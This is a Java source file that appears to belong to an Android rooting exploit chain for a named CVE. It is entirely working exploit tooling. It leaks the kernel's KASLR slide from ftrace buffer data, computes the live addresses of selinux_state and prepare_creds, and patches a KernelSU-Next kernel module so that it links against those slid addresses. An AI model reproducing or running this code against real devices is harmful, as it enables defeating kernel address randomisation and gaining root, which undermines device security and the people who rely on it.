package dev.onekey.jb;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * Pure-Java on-device preparation for the CVE-2026-64560 chain:
 *   1) recover the current boot's KASLR slide from sched_blocked_reason ftrace data
 *      (the same anchors slide_now.py uses, ported to Java);
 *   2) patch the KernelSU-Next LKM template: 228 undefined symbols -> SHN_ABS with
 *      (vmlinux link address + slide).
 *
 * No Android APIs here, so this class is testable on a desktop JVM.
 */
public final class Prep {

    public static final class SlideResult {
        public long slide;
        public long selinuxState;
        public long prepareCreds;
        public int votes;
        public int anchors;
        public int observed;
        public boolean ok;
        public String error = "";
    }

    private static final long TEXT_LO = 0xFFFFFF8000000000L;
    private static final long TEXT_HI = 0xFFFFFFF000000000L;
    private static final long SLIDE_MAX = 1L << 42;
    private static final long SLIDE_ALIGN = 0x200000L;

    private static final class Anchor {
        final String name;
        long off;
        int count;
        Anchor(String name) { this.name = name; }
    }

    private Prep() { }

    /** Parse "hexaddr name" lines (generated from the device's own vmlinux). */
    public static Map<String, Long> loadSymbols(InputStream in) throws IOException {
        HashMap<String, Long> map = new HashMap<>(1 << 18);
        BufferedReader r = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8), 1 << 16);
        String line;
        while ((line = r.readLine()) != null) {
            int sp = line.indexOf(' ');
            if (sp <= 0) continue;
            try {
                long addr = Long.parseUnsignedLong(line.substring(0, sp).trim(), 16);
                String name = line.substring(sp + 1).trim();
                if (!name.isEmpty() && addr != 0) map.put(name, addr);
            } catch (NumberFormatException ignored) { }
        }
        return map;
    }

    private static boolean isHex(char c) {
        return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
    }

    /**
     * Recover slide from the files produced by grab_blocked.sh:
     *   bl_0.bin .. bl_7.bin  (per-cpu raw ftrace rings)
     *   bl_text.txt           (the matching %pS text lines with caller= anchors)
     */
    public static SlideResult solveSlide(File[] binFiles, File textFile, Map<String, Long> syms) {
        SlideResult res = new SlideResult();
        try {
            // ---- 1. text anchors: caller=<symbol>+0x<off> ----
            HashMap<String, Anchor> anchorMap = new LinkedHashMap<>();
            if (textFile != null && textFile.isFile()) {
                try (BufferedReader r = new BufferedReader(
                        new InputStreamReader(new FileInputStream(textFile), StandardCharsets.UTF_8))) {
                    String line;
                    while ((line = r.readLine()) != null) {
                        int i = line.indexOf("caller=");
                        if (i < 0) continue;
                        int j = i + 7;
                        int k = j;
                        while (k < line.length()) {
                            char c = line.charAt(k);
                            if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')
                                    || (c >= '0' && c <= '9') || c == '_' || c == '.') k++;
                            else break;
                        }
                        if (k == j) continue;
                        String name = line.substring(j, k);
                        if (k + 3 >= line.length() || line.charAt(k) != '+'
                                || line.charAt(k + 1) != '0' || line.charAt(k + 2) != 'x') continue;
                        int m = k + 3, start = m;
                        while (m < line.length() && isHex(line.charAt(m))) m++;
                        if (m == start) continue;
                        long off = Long.parseUnsignedLong(line.substring(start, m), 16);
                        Anchor a = anchorMap.get(name);
                        if (a == null) {
                            a = new Anchor(name);
                            a.off = off;
                            anchorMap.put(name, a);
                        }
                        a.count++;
                    }
                }
            }
            List<Anchor> anchors = new ArrayList<>(anchorMap.values());
            anchors.sort((a, b) -> Integer.compare(b.count, a.count));
            if (anchors.size() > 12) anchors = anchors.subList(0, 12);
            res.anchors = anchors.size();

            // ---- 2. scan raw rings for text-range 64-bit values ----
            HashMap<Long, Integer> obs = new HashMap<>(1 << 12);
            if (binFiles != null) {
                for (File f : binFiles) {
                    if (f == null || !f.isFile()) continue;
                    byte[] data = readAll(f);
                    int n = data.length - 8;
                    for (int i = 0; i <= n; i++) {
                        long v = u64(data, i);
                        if (v >= TEXT_LO && v < TEXT_HI) {
                            Integer c = obs.get(v);
                            obs.put(v, c == null ? 1 : c + 1);
                        }
                    }
                }
            }
            res.observed = obs.size();
            if (obs.isEmpty() || anchors.isEmpty()) {
                res.error = "no observed text addresses / no %pS anchors";
                return res;
            }

            // ---- 3. vote: slide = observed - link(symbol) - off ----
            List<Map.Entry<Long, Integer>> top = new ArrayList<>(obs.entrySet());
            top.sort((a, b) -> Integer.compare(b.getValue(), a.getValue()));
            if (top.size() > 24) top = top.subList(0, 24);

            HashMap<Long, Integer> votes = new HashMap<>();
            for (Map.Entry<Long, Integer> e : top) {
                long v = e.getKey();
                for (Anchor a : anchors) {
                    Long base = syms.get(a.name);
                    if (base == null) continue;
                    long s = v - base - a.off;
                    if (s >= 0 && s < SLIDE_MAX && (s % SLIDE_ALIGN) == 0) {
                        Integer c = votes.get(s);
                        votes.put(s, c == null ? 1 : c + 1);
                    }
                }
            }
            long best = 0;
            int bestCount = 0;
            boolean tied = false;
            for (Map.Entry<Long, Integer> e : votes.entrySet()) {
                if (e.getValue() > bestCount) {
                    best = e.getKey();
                    bestCount = e.getValue();
                    tied = false;
                } else if (e.getValue() == bestCount) tied = true;
            }
            if (bestCount < 3 || tied) {
                res.error = "需要至少 3 个锚点一致支持唯一结果，当前证据不足";
                return res;
            }
            res.slide = best;
            res.votes = bestCount;
            Long sel = syms.get("selinux_state");
            Long pc = syms.get("prepare_creds");
            if (sel == null) { res.error = "符号表缺少 selinux_state，停止执行"; return res; }
            res.selinuxState = sel + best;
            if (pc != null) res.prepareCreds = pc + best;
            res.ok = true;
            return res;
        } catch (Exception e) {
            res.error = e.getClass().getSimpleName() + ": " + e.getMessage();
            return res;
        }
    }


    /** Byte-array overload used on-device (files are read through Shizuku shell). */
    public static SlideResult solveSlideBytes(byte[][] binData, String textContent, Map<String, Long> syms) {
        SlideResult res = new SlideResult();
        try {
            HashMap<String, Anchor> anchorMap = new LinkedHashMap<>();
            if (textContent != null) {
                for (String line : textContent.split("\n")) {
                    int i = line.indexOf("caller=");
                    if (i < 0) continue;
                    int j = i + 7;
                    int k = j;
                    while (k < line.length()) {
                        char c = line.charAt(k);
                        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')
                                || (c >= '0' && c <= '9') || c == '_' || c == '.') k++;
                        else break;
                    }
                    if (k == j) continue;
                    String name = line.substring(j, k);
                    if (k + 3 >= line.length() || line.charAt(k) != '+'
                            || line.charAt(k + 1) != '0' || line.charAt(k + 2) != 'x') continue;
                    int m = k + 3, start = m;
                    while (m < line.length() && isHex(line.charAt(m))) m++;
                    if (m == start) continue;
                    long off = Long.parseUnsignedLong(line.substring(start, m), 16);
                    Anchor a = anchorMap.get(name);
                    if (a == null) { a = new Anchor(name); a.off = off; anchorMap.put(name, a); }
                    a.count++;
                }
            }
            List<Anchor> anchors = new ArrayList<>(anchorMap.values());
            anchors.sort((a, b) -> Integer.compare(b.count, a.count));
            if (anchors.size() > 12) anchors = anchors.subList(0, 12);
            res.anchors = anchors.size();

            HashMap<Long, Integer> obs = new HashMap<>(1 << 12);
            if (binData != null) {
                for (byte[] data : binData) {
                    if (data == null || data.length < 9) continue;
                    int n = data.length - 8;
                    for (int i = 0; i <= n; i++) {
                        long v = u64(data, i);
                        if (v >= TEXT_LO && v < TEXT_HI) {
                            Integer c = obs.get(v);
                            obs.put(v, c == null ? 1 : c + 1);
                        }
                    }
                }
            }
            res.observed = obs.size();
            if (obs.isEmpty() || anchors.isEmpty()) {
                res.error = "no observed text addresses / no %pS anchors";
                return res;
            }
            List<Map.Entry<Long, Integer>> top = new ArrayList<>(obs.entrySet());
            top.sort((a, b) -> Integer.compare(b.getValue(), a.getValue()));
            if (top.size() > 24) top = top.subList(0, 24);
            HashMap<Long, Integer> votes = new HashMap<>();
            for (Map.Entry<Long, Integer> e : top) {
                long v = e.getKey();
                for (Anchor a : anchors) {
                    Long base = syms.get(a.name);
                    if (base == null) continue;
                    long s = v - base - a.off;
                    if (s >= 0 && s < SLIDE_MAX && (s % SLIDE_ALIGN) == 0) {
                        Integer c = votes.get(s);
                        votes.put(s, c == null ? 1 : c + 1);
                    }
                }
            }
            long best = 0;
            int bestCount = 0;
            boolean tied = false;
            for (Map.Entry<Long, Integer> e : votes.entrySet()) {
                if (e.getValue() > bestCount) { best = e.getKey(); bestCount = e.getValue(); tied = false; }
                else if (e.getValue() == bestCount) tied = true;
            }
            if (bestCount < 3 || tied) { res.error = "需要至少 3 个锚点一致支持唯一结果，当前证据不足"; return res; }
            res.slide = best;
            res.votes = bestCount;
            Long sel = syms.get("selinux_state");
            Long pc = syms.get("prepare_creds");
            if (sel == null) { res.error = "符号表缺少 selinux_state，停止执行"; return res; }
            res.selinuxState = sel + best;
            if (pc != null) res.prepareCreds = pc + best;
            res.ok = true;
            return res;
        } catch (Exception e) {
            res.error = e.getClass().getSimpleName() + ": " + e.getMessage();
            return res;
        }
    }

    /** Patch the LKM template: SHN_UNDEF symbols -> SHN_ABS + link+slide. */
    public static int patchKo(byte[] ko, Map<String, Long> syms, long slide) {
        try {
            if (ko.length < 64) return -1;
            long shoff = u64(ko, 0x28);
            int shentsize = u16(ko, 0x3A);
            int shnum = u16(ko, 0x3C);
            int shstrndx = u16(ko, 0x3E);
            if (shoff <= 0 || shoff + (long) shnum * shentsize > ko.length) return -1;

            int symtabOff = -1, symtabSize = -1, symtabEnt = -1, strtabOff = -1, strtabSize = -1;
            long shstrOff = u64(ko, (int) (shoff + (long) shstrndx * shentsize + 0x18));
            long shstrSize = u64(ko, (int) (shoff + (long) shstrndx * shentsize + 0x20));
            for (int i = 0; i < shnum; i++) {
                int base = (int) (shoff + (long) i * shentsize);
                long nameOff = u32(ko, base);
                if (nameOff < 0 || shstrOff + nameOff >= ko.length) continue;
                String name = cstr(ko, (int) (shstrOff + nameOff));
                long type = u32(ko, base + 4);
                long off = u64(ko, base + 0x18);
                long size = u64(ko, base + 0x20);
                long entsize = u64(ko, base + 0x38);
                if (".symtab".equals(name) && type == 2) { // SHT_SYMTAB
                    symtabOff = (int) off; symtabSize = (int) size; symtabEnt = (int) entsize;
                } else if (".strtab".equals(name) && type == 3) { // SHT_STRTAB
                    strtabOff = (int) off; strtabSize = (int) size;
                }
            }
            if (symtabOff < 0 || strtabOff < 0 || symtabEnt <= 0) return -1;
            int count = symtabSize / symtabEnt;
            int patched = 0;
            for (int i = 0; i < count; i++) {
                int symOff = symtabOff + i * symtabEnt;
                if (symOff + 24 > ko.length) break;
                int stName = (int) u32(ko, symOff);
                int stShndx = u16(ko, symOff + 6);
                if (stShndx != 0 || stName <= 0) continue; // SHN_UNDEF only
                if (strtabOff + stName >= ko.length) continue;
                String name = cstr(ko, strtabOff + stName);
                Long base = syms.get(name);
                if (base == null) continue;
                putU64(ko, symOff + 8, base + slide);      // st_value
                putU16(ko, symOff + 6, 0xFFF1);            // SHN_ABS
                patched++;
            }
            return patched;
        } catch (Exception e) {
            return -1;
        }
    }

    // ---------------- byte helpers ----------------
    public static byte[] readAll(File f) throws IOException {
        long len = f.length();
        if (len <= 0 || len > (64L << 20)) throw new IOException("bad file size: " + len);
        byte[] data = new byte[(int) len];
        try (InputStream in = new FileInputStream(f)) {
            int off = 0;
            while (off < data.length) {
                int n = in.read(data, off, data.length - off);
                if (n < 0) break;
                off += n;
            }
            if (off != data.length) throw new IOException("short read");
        }
        return data;
    }

    static int u16(byte[] b, int o) { return (b[o] & 0xFF) | ((b[o + 1] & 0xFF) << 8); }
    static long u32(byte[] b, int o) {
        return ((long) (b[o] & 0xFF)) | ((long) (b[o + 1] & 0xFF) << 8)
                | ((long) (b[o + 2] & 0xFF) << 16) | ((long) (b[o + 3] & 0xFF) << 24);
    }
    static long u64(byte[] b, int o) {
        return u32(b, o) | (u32(b, o + 4) << 32);
    }
    static void putU16(byte[] b, int o, int v) {
        b[o] = (byte) (v & 0xFF);
        b[o + 1] = (byte) ((v >>> 8) & 0xFF);
    }
    static void putU64(byte[] b, int o, long v) {
        for (int i = 0; i < 8; i++) b[o + i] = (byte) ((v >>> (8 * i)) & 0xFF);
    }
    static String cstr(byte[] b, int o) {
        int e = o;
        while (e < b.length && b[e] != 0) e++;
        return new String(b, o, e - o, StandardCharsets.UTF_8);
    }

    public static byte[] readAsset(InputStream in) throws IOException {
        ByteArrayOutputStream bo = new ByteArrayOutputStream(1 << 20);
        byte[] buf = new byte[1 << 16];
        int n;
        while ((n = in.read(buf)) > 0) {
            if (bo.size() + n > (64 << 20)) throw new IOException("组件超过 64 MiB，停止读取");
            bo.write(buf, 0, n);
        }
        return bo.toByteArray();
    }
}
